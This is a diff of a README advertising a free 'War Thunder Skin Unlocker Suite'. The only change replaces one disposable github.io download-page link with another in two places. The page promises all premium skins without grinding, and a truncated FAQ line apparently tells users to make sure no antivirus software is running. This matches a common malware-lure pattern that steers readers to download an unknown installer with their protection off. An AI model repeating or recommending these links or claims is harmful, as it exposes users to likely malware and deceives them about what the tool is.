@@ -2,7 +2,7 @@
 
 The War Thunder Skin Unlocker Suite is an essential tool for any War Thunder enthusiast looking to unlock all available skins effortlessly. Designed for the 2026 version of the game, this suite provides a seamless and secure way to customize your vehicles and enhance your overall gaming experience, offering a premium level of access without the need for extensive grinding. With its user-friendly design and regular updates, it stands out as a top choice for players seeking to elevate their War Thunder sessions.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://yellowtaxisave.github.io/download-page/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://capitals-707-bringing.github.io/download-page/)
 
 ## Features
 
@@ -68,6 +68,6 @@ A6: Ensure that you have administrative privileges and that no antivirus softwar
 
 For the latest version of the War Thunder Skin Unlocker Suite, visit the official download page:
 
-[Download from official website](https://yellowtaxisave.github.io/download-page/)
+[Download from official website](https://capitals-707-bringing.github.io/download-page/)
 
 This tool is provided free of charge and comes with regular updates to enhance your War Thunder experience. Enjoy unlocking all skins and customizing your vehicles to the fullest, giving you a unique edge in battles and making every match more visually appealing!
